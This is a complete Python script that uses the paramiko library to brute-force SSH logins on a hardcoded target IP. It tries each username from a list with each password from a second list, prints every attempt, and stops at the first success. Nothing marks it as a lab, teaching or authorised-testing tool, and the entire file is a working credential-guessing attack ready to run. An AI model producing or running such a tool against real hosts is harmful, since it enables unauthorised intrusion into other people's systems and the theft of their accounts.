#!/usr/bin/env python3

import paramiko
import socket
import time

# ✏ Set the target IP and port
target_ip = "1.2.2.2"
target_port = 22

# ✏ Files containing usernames and passwords (one per line)
user_file = "userlist.txt"
pass_file = "pwdss.txt"

# Delay and timeout
delay = 0.5
timeout = 5

def try_login(username, password):
    ssh = paramiko.SSHClient()
    ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
    try:
        ssh.connect(
            hostname=target_ip,
            port=target_port,
            username=username,
            password=password,
            timeout=timeout,
            allow_agent=False,
            look_for_keys=False
        )
        print(f"\n[✅] SUCCESS: {username}:{password}")
        return True
    except paramiko.AuthenticationException:
        print(f"[❌] Incorrect ({username}:{password})")
    except (paramiko.SSHException, socket.error) as e:
        print(f"[⚠] Error ({username}:{password}): {e}")
    finally:
        ssh.close()
        time.sleep(delay)  # ✅ Always enforce delay
    return False

try:
    # Open files with specified encoding to avoid decoding issues
    with open(user_file, "r", encoding="utf-8", errors="ignore") as uf, open(pass_file, "r", encoding="utf-8", errors="ignore") as pf:
        usernames = [u.strip() for u in uf if u.strip()]
        passwords = [p.strip() for p in pf if p.strip()]
        for user in usernames:
            for pwd in passwords:
                if try_login(user, pwd):
                    exit(0)
except FileNotFoundError:
    print("[❌] Username or password file not found.")
except KeyboardInterrupt:
    print("\n[⛔] Interrupted by user.")
